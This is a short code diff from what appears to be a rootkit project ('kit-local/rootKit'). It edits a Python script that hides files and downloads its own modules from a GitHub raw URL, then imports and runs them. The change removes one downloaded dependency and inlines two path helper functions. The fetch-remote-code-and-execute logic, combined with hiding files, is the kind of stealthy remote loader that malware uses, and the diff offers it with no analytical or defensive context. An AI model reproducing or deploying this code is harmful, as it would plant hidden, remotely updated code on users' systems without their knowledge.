@@ -1,4 +1,4 @@
-listFileDepency = ['scripter.py', 'sound.py', 'fct.py']
+listFileDepency = ['scripter.py', 'sound.py']
 hideFile = ["__pycache__"]
 githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
 import socket
@@ -39,7 +39,10 @@ for file in hideFile:
     f.hide(file)
 for file in listFileDepency:
     f.modify(file, githubUrl+file)
-from fct import *
+
+def getpath(change=False):                          return os.getcwd() if change in (False, "not", "\\") else os.getcwd().replace('\\', '/')
+def getSelfFileName():                              return os.path.basename(__file__)
+
 from sound import Sound
 import scripter
 s = Sound()
